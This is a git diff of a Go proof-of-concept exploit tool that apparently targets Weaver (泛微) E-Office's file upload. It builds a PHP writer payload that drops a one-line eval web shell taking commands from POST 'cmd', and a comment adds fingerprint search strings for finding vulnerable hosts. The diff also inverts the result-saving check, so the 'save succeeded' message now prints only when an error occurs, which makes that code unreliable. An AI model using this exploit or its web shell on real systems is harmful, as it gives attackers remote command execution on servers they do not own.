@@ -28,12 +28,12 @@ import (
 )
 
 var (
-	target        string
-	uploadfile    string
-	targetfile    string
-	shellName     string
-	output        string
-	verifyStr     string
+	target     string
+	uploadfile string
+	targetfile string
+	shellName  string
+	output     string
+	//verifyStr     string
 	WarnOutput    *color.Color = color.New(color.FgRed, color.Bold)
 	SuccessOutput *color.Color = color.New(color.FgGreen, color.Bold)
 )
@@ -47,6 +47,10 @@ func init() {
 }
 
 func main() {
+	/*
+		app="泛微-EOffice"
+		app:"泛微协同办公标准产品EOffice"
+	*/
 	poc()
 }
 
@@ -110,7 +114,8 @@ func uploadFile(t string) {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Fatalln("请求出错", err.Error())
+		log.Println("请求出错", err.Error())
+		return
 	}
 	defer resp.Body.Close()
 
@@ -148,7 +153,7 @@ func createHttpClient() *http.Client {
 
 func getPayload(fn string) string {
 
-	verifyStr = getRandString(32) + "\n"
+	//verifyStr = getRandString(32) + "\n"
 	evilCode := "<?php @eval($_POST[\"cmd\"]);?>"
 	if uploadfile == "" {
 		//没有指定文件，尝试写入一句话
@@ -157,18 +162,18 @@ func getPayload(fn string) string {
 	} else {
 		f, err := os.Open(uploadfile)
 		if err != nil {
-			log.Fatalln("打开文件错误....")
+			log.Println("打开文件错误....")
 		}
 		defer f.Close()
 
 		data, err := ioutil.ReadAll(f)
 		if err != nil {
-			log.Fatalln("读取文件错误...")
+			log.Println("读取文件错误...")
 		}
 		evilCode = string(data)
 	}
 
-	evilCode = base64.StdEncoding.EncodeToString([]byte(verifyStr + evilCode)) //写php代码时最好用base64，不然会出现一些问题。
+	evilCode = base64.StdEncoding.EncodeToString([]byte(evilCode)) //写php代码时最好用base64，不然会出现一些问题。
 	return fmt.Sprintf("<?php $f=fopen(\"%s\", \"w\");$d='%s';fwrite($f, base64_decode($d));fclose($f);?>", fn, evilCode)
 
 }
@@ -231,7 +236,7 @@ func saveResults(filename string, res string) {
 		}
 		defer f.Close()
 		n, err := io.WriteString(f, res+"\n")
-		if n == 0 && err == nil {
+		if n > 0 && err != nil {
 			log.Println("保存结果成功..")
 			return
 		}
